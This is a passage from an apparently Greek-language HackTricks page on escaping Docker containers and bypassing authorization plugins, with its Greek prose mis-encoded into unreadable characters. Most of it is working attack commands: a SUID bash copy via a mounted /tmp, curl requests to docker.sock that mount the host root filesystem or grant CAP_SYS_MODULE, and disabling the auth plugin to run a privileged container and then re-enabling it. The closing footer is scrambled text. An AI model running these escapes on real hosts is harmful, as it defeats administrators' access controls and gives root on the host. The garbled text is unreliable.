Î¤ÏÏÎ±, Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï†ÏÎ³ÎµÎ¹ Î±Ï€ÏŒ Ï„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Ï„Î¹Ï‚ [**Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ ÏƒÏ…Î¶Î·Ï„Î·Î¸ÎµÎ¯ÏƒÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚**](./#privileged-flag) ÎºÎ±Î¹ **Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Î¿Î¹ÎºÎ¿Î´ÎµÏƒÏ€ÏŒÏ„Î·.

## Î¤Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Î•Î³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿Ï… Î¦Î±ÎºÎ­Î»Î¿Ï…

Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ **Î±Ï€Î±Î³ÏŒÏÎµÏ…ÏƒÎµ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¹Î»Î¿Î³Î® `--privileged`** Î® Î½Î± Î´Î¯Î½Î¿Ï…Î½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ, ÎºÎ±Î¹ ÎµÏ€Î­Ï„ÏÎµÏˆÎµ Î¼ÏŒÎ½Î¿ Ï„Î·Î½ Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Ï„Î¿Ï… Ï†Î±ÎºÎ­Î»Î¿Ï… `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¯ÏƒÏ‰Ï‚ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ `/tmp`, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿ Ï†Î¬ÎºÎµÎ»Î¿**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿Ï…Ï‚ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚: `find / -writable -type d 2>/dev/null`

**Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏŒÏ‡Î¹ ÏŒÎ»Î¿Î¹ Î¿Î¹ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Î¹ ÏƒÎµ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® linux Î¸Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿ suid bit!** Î“Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï€Î¿Î¹Î¿Ï…Ï‚ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿ suid bit, ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `mount | grep -v "nosuid"` Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¿Î¹ `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ÎºÎ±Î¹ `/var/lib/lxcfs` Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿ suid bit.

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÏŒÏ„Î¹ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ `/etc`** Î® Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ Ï†Î¬ÎºÎµÎ»Î¿ **Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±ÏÏ‡ÎµÎ¯Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ docker container Ï‰Ï‚ root Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± **Ï„Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ host** ÎºÎ±Î¹ Î½Î± ÎºÎµÏÎ´Î¯ÏƒÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± (Î¯ÏƒÏ‰Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `/etc/shadow`)
{% endhint %}

## ÎœÎ· ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î¿ API Endpoint

Î— ÎµÏ…Î¸ÏÎ½Î· Ï„Î¿Ï… sysadmin Ï€Î¿Ï… ÏÏ…Î¸Î¼Î¯Î¶ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ plugin Î¸Î± ÎµÎ¯Î½Î±Î¹ Î½Î± ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï€Î¿Î¹ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î¼Îµ Ï€Î¿Î¹Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎºÎ¬Î¸Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· **Î¼Î±ÏÏÎ·Ï‚ Î»Î¯ÏƒÏ„Î±Ï‚** Î¼Îµ Ï„Î± endpoints ÎºÎ±Î¹ Ï„Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î¾ÎµÏ‡Î¬ÏƒÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¬ Î±Ï€ÏŒ Î±Ï…Ï„Î¬** Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **ÎºÎµÏÎ´Î¯ÏƒÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±.**

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ docker API ÏƒÏ„Î¿ [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## ÎœÎ· ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î· Î”Î¿Î¼Î® JSON

### Î”ÎµÏƒÎ¼Î¿Î¯ ÏƒÏ„Î¿ root

Î•Î¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î¿ sysadmin ÏÏÎ¸Î¼Î¹ÏƒÎµ Ï„Î¿ docker firewall, **Î¾Î­Ï‡Î±ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿** Ï„Î¿Ï… [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) ÏŒÏ€Ï‰Ï‚ Ï„Î¿ "**Binds**".\
Î£Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î® Ï„Î· Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î­Î½Î± container Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÎ±ÏÏ„Î¬ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ root (/) Ï„Î¿Ï… host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼Îµ Ï„Î¿ **`Binds`** Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿ Ï‰Ï‚ ÎºÎ»ÎµÎ¹Î´Î¯ ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… ÏÎ¯Î¶Î±Ï‚ ÏƒÏ„Î¿ JSON Î±Î»Î»Î¬ ÏƒÏ„Î·Î½ API ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ **`HostConfig`**
{% endhint %}

### Binds in HostConfig

Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î¼Îµ **Binds in root** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ **Î±Î¯Ï„Î·ÏƒÎ·** ÏƒÏ„Î·Î½ Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î¼Îµ **Binds in root** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ **Î±Î¯Ï„Î·ÏƒÎ·** ÏƒÏ„Î¿ Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Î‘ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î¼Îµ **Binds in root** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ **Î±Î¯Ï„Î·ÏƒÎ·** ÏƒÏ„Î¿ Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Î•Î¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎµ Ï„Î¿ docker firewall **Î¾Î­Ï‡Î±ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Î¼Î¹Î±Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…** Ï„Î¿Ï… [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) ÏŒÏ€Ï‰Ï‚ Ï„Î¿ "**Capabilities**" Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ "**HostConfig**". Î£Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Î±Ï…Ï„Î® Ï„Î· Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Îµ Ï„Î·Î½ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î± **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Î— **`HostConfig`** ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î± **ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î±** **Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** Î³Î¹Î± Î½Î± Î¾ÎµÏ†ÏÎ³ÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏŒÏ€Ï‰Ï‚ Î­Ï‡Î¿Ï…Î¼Îµ ÏƒÏ…Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ Î· Ï‡ÏÎ®ÏƒÎ· Binds ÎµÎºÏ„ÏŒÏ‚ Î±Ï…Ï„Î¿Ï Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚.
{% endhint %}

## Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î ÏÏŒÏƒÎ¸ÎµÏ„Î¿Ï…

Î•Î¬Î½ Î¿ **Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚** **Î¾Î­Ï‡Î±ÏƒÎµ** Î½Î± **Î±Ï€Î±Î³Î¿ÏÎµÏÏƒÎµÎ¹** Ï„Î·Î½ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î± Î½Î± **Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** Ï„Î¿ **Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Ï„Î¿ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎµÎ½Ï„ÎµÎ»ÏÏ‚!
```bash
docker plugin list #Enumerate plugins

# If you donâ€™t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Remember to **re-enable the plugin after escalating**, or a **restart of docker service wonâ€™t work**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## References
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
